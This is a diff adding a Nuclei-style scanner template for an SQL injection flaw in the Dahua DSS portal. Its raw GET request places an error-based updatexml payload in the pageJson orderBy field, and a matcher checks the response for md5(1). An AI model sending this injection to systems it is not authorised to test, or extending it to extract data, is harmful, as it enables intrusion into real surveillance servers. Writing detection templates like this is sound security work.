@@ -1,0 +1,26 @@
+id: dahua-dss-pageJson-sqli
+info:
+  name: 大华DSS-portal接口存在SQL注入漏洞
+  author: apple
+  severity: high
+  description: 大华DSS-portal接口存在SQL注入漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /portal/services/carQuery/getFaceRecognition/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--%22%7D/extend/1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 568
+        Connection: close
+    matchers:
+      - type: word
+        part: body
+        words:
+          - c4ca4238a0b923820dcc509a6f75849
